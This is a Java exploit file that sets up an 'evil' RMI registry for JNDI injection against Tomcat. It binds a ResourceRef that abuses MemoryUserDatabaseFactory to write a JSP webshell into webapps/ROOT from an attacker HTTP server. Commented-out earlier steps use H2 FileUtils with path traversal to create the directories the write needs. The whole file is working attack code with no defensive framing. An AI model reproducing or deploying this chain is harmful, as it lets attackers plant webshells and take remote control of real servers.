package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class UserDataRCE_Server_linux {
    public static void main(String[] args) throws Exception{
        System.out.println("Creating evil RMI registry on port 1100");
        Registry registry = LocateRegistry.createRegistry(1100);
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");

        // ===============================1 创建http:/==================================
        // ResourceRef ref = new ResourceRef("org.h2.store.fs.FileUtils", null, "", "",
        //         true, "org.apache.naming.factory.BeanFactory", null);
        // ref.add(new StringRefAddr("forceString", "a=createDirectory"));
        // ref.add(new StringRefAddr("a", "../http:"));

        // ===============================2 创建http:/127.0.0.1:7777.1:8888/============
        // ResourceRef ref = new ResourceRef("org.h2.store.fs.FileUtils", null, "", "",
        //         true, "org.apache.naming.factory.BeanFactory", null);
        // ref.add(new StringRefAddr("forceString", "a=createDirectory"));
        // ref.add(new StringRefAddr("a", "../http:/127.0.0.1:8888"));

        // ===============================3 写入webshell文件=============================
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:7777/../../webapps/ROOT/webshell.jsp"));
        ref.add(new StringRefAddr("readonly", "false"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("writeFile", referenceWrapper);
    }
}
